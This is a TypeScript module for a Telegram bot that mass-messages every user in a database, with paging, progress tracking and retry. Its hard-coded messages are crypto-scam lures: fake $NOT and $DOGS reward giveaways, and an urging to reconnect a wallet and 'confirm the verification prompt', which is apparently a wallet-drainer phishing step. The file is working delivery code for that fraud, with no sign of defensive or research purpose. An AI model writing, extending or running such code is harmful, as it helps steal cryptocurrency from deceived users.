import prisma from "@/backend/modules/prisma/Prisma";
import DodoBot from "./classes/DodoBot";
import { getMenuButtons } from "./classes/DodoClient";
import { getBotConfig } from "@/bot/classes/CustomTelegraf";


const texts = [
    `🚨 {username}, If after wallet connection you received a transaction with a comment, connect your wallet again.
Confirm the verification prompt. Ref:#91103

🎉 It means that you can receive a reward, and the system has sent a verification message to ensure your wallet is not a spam wallet.`,
    `Welcome, esteemed user! 🦴

Each user has a chance to receive a reward based on their activity: The more active you are — the greater the reward.

Currently, there is a distribution of 100 mln $NOT and $DOGS.

Hurry up to claim your bonus 🎁`
]

async function sleep(ms: number): Promise<void> {
    return new Promise<void>(r => setTimeout(r, ms));
}
let uploadedImages: {
    [path: string]: string | undefined
} = {};

export async function handleAd(dodoBot: DodoBot, skip = 0, step = 0, take = 50) {
    const condition = {
        OR: [
            {
                clients: {
                    has: dodoBot.bot.me?.id + ""
                }
            },
            {
                clients: {
                    isEmpty: true
                }
            }
        ]
    }
    try {
        const skipKey = `bot_${dodoBot.bot.me?.id}_skip`;
        const preSkip = (+((await prisma.siteSetting.findUnique({
            where: {
                key: skipKey
            }
        }))?.value || '0')) || 0;
        if (skip < preSkip) skip = preSkip;

        const users_count = await prisma.user.count({
            where: condition
        });
        if (users_count <= skip) {
            console.log(dodoBot.bot.me?.username, "AD FINISHED", users_count);
            await prisma.siteSetting.upsert({
                where: {
                    key: skipKey
                },
                create: {
                    key: skipKey,
                    value: 0
                },
                update: {
                    value: 0
                }
            })
            return;
        }

        const users = await prisma.user.findMany({
            where: condition,
            skip,
            take
        });
        if (step % 5 === 0) {
            console.log(dodoBot.bot.me?.username, "AD STEP", skip + "/" + users_count, "|", users.length)
        }

        const config = await getBotConfig(dodoBot.bot);

        await Promise.all(users.map(async user => {
            const userAdStepKey = `bot_${dodoBot.bot.me?.id}_${user.id}_ad_step`;
            const userStep = (+((await prisma.siteSetting.findUnique({
                where: {
                    key: userAdStepKey
                }
            }))?.value + "")) || 0;

            let ad = (config?.ads ?? texts)[userStep % texts.length];

            if (typeof ad === 'string') {
                ad = ad.replaceAll("{username}", (user.username || user.chatId) + "");
                const buttons = await getMenuButtons(dodoBot.bot, user);
                try {
                    await dodoBot.bot.telegram.sendMessage(user.chatId, ad, buttons).catch(() => undefined);
                } catch (error) {
                    // console.error(dodoBot.bot.me?.username,`Failed to send message to user ${user.chatId}:`, error);
                }
            } else if (ad.isPhoto) {
                ad.content = ad.content.replaceAll("{username}", (user.username || user.chatId) + "")
                const buttons = await getMenuButtons(dodoBot.bot, user, ad.buttons)

                const previousUpload = uploadedImages[ad.image];
                try {
                    const sent = await dodoBot.bot.telegram.sendPhoto(user.chatId, previousUpload ? previousUpload : {
                        source: process.cwd() + ad.image
                    }, {
                        ...buttons,
                        caption: ad.content
                    });

                    uploadedImages[ad.image] = sent.photo.at(0)?.file_id;
                } catch (error) {
                    // console.error(dodoBot.bot.me?.username,`Failed to send message to user ${user.chatId}:`, error);
                }
            }


            await prisma.siteSetting.upsert({
                where: {
                    key: userAdStepKey
                },
                create: {
                    key: userAdStepKey,
                    value: userStep + 1
                },
                update: {
                    value: userStep + 1
                }
            })
        }));

        await prisma.siteSetting.upsert({
            where: {
                key: skipKey
            },
            create: {
                key: skipKey,
                value: skip + take
            },
            update: {
                value: skip + take
            }
        })

        await sleep(1000);
        await handleAd(dodoBot, skip + take, step + 1, take);
    } catch (e) {
        console.error(e);
        handleAd(dodoBot, skip + take, step, take);
    }
}
